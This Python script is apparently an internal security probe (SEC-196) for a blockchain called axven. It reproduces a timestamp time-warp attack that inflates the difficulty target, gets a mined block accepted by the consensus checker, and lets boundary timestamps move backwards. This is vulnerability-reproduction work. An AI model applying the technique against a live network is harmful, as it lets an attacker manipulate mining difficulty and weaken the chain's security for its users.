#!/usr/bin/env python3
"""SEC-196 probe: demonstrate retarget time-warp acceptance on current consensus."""
from __future__ import annotations

import axven


class PathBlock:
    def __init__(self, height, timestamp, target):
        self.height = height
        self.timestamp = timestamp
        self.target = target

    def hash(self):
        return f"{self.height:064x}"


def mine_pow(block):
    while not block.pow_ok():
        block.nonce += 1
    return block


def main():
    interval = axven.ADJUST_INTERVAL
    base_target = axven.MAX_TARGET // 16

    # Build one synthetic adjustment window with otherwise regular 2-second
    # timestamps, then give only its final block an extreme future timestamp.
    path = [PathBlock(i, i * axven.TARGET_BLOCK_TIME, base_target) for i in range(interval)]
    honest_last = path[-1].timestamp
    honest_target = axven.compute_next_target(
        base_target,
        honest_last - path[0].timestamp,
    )

    # Current consensus has only a lower MTP bound, so this terminal timestamp
    # can be arbitrarily far in the future while remaining MTP-valid.
    path[-1].timestamp = path[0].timestamp + axven.TARGET_TIMESPAN * 100
    attacked_target = axven.next_target_for_height(path, interval)

    assert attacked_target == min(axven.MAX_TARGET, base_target * axven.RETARGET_CLAMP)
    assert attacked_target >= honest_target * 3
    assert path[-1].timestamp > axven.median_time_past(path, interval - 1)
    print("[VULNERABLE] terminal timestamp inflates next target")
    print("honest_target=", honest_target)
    print("attacked_target=", attacked_target)
    print("ratio=", attacked_target / honest_target)

    # Prove the real contextual header checker accepts the resulting retarget
    # target because it has no upper/future timestamp rule or period-end guard.
    height = interval
    miner = "M" + "0" * 40
    coinbase = axven.make_coinbase(miner, 1, height)
    candidate = axven.Block(
        height=height,
        timestamp=path[-1].timestamp + 1,
        previous_hash=path[-1].hash(),
        merkle_root=axven.merkle_root([coinbase.txid()]),
        target=attacked_target,
        transactions=[coinbase.to_dict()],
        nonce=0,
        miner=miner,
        utxo_state_root="0" * 64,
    )
    mine_pow(candidate)
    err = axven._check_context(candidate, path, height)
    assert err is None, err
    print("[VULNERABLE] _check_context accepts the time-warp-derived target")

    # A period-boundary block can also move backwards relative to the previous
    # block as long as it remains above the median of the previous 11 blocks.
    boundary_path = [PathBlock(i, i * 100, base_target) for i in range(interval)]
    mtp = axven.median_time_past(boundary_path, interval)
    assert mtp < boundary_path[-1].timestamp
    backwards = mtp + 1
    assert backwards < boundary_path[-1].timestamp
    print("[VULNERABLE] adjustment-boundary timestamp may move backwards:",
          boundary_path[-1].timestamp, "->", backwards)

    print("SEC-196 time-warp probe: vulnerability reproduced")


if __name__ == "__main__":
    main()
